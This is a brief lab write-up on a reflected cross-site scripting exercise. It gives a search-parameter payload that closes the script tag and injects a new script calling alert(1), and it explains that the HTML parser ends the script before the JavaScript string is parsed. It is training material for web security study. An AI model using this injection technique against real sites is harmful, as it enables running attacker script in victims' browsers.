# Lab 18 — Reflected XSS JS String, Quotes + Backslash Escaped (PRACTITIONER)

## Payload
```
/search?search=</script><script>alert(1)</script>
```
HTML parser terminates `<script>` before JS sees the string.
